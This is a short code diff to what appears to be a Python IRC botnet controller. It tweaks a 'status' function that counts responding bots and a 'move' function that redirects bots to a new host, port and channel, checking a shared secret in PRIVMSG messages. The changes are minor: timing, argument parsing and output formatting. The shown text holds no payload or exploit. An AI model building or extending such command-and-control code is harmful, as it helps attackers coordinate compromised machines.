@@ -57,7 +57,7 @@ def status(s):
 
 	s.send(msg.encode('utf-8'))
 	print("waiting for bots to respond...")
-	time.sleep(5)
+	time.sleep(30)
 	print("done sleeping")
 	recvd_lines = s.recv(1024).decode('utf-8') #this buffer size may need to change
 	lines = recvd_lines.split('\n')
@@ -66,6 +66,8 @@ def status(s):
 			continue
 		try:
 			prefix, command, args = parsemsg(line)
+			args = args[1].split()
+			print("prefix: %s\ncommand : %s\nargs : %s" %(prefix, command, args))
 			if command != "PRIVMSG" or args[0] != secret:
 				continue
 
@@ -77,7 +79,7 @@ def status(s):
 
 	bot_string = "Found %d bots: " % len(bot_list)
 	for bot in bot_list:
-		bot_string += bot + ", "
+		bot_string += bot + " "
 	print(bot_string)
 
 def move(s, hostname, newport, channel):
@@ -96,6 +98,7 @@ def move(s, hostname, newport, channel):
 		if not line:
 			continue
 		prefix, command, args = parsemsg(line)
+		args = args[1].split()
 		if command != "PRIVMSG" or args[0] != secret:
 			continue
 
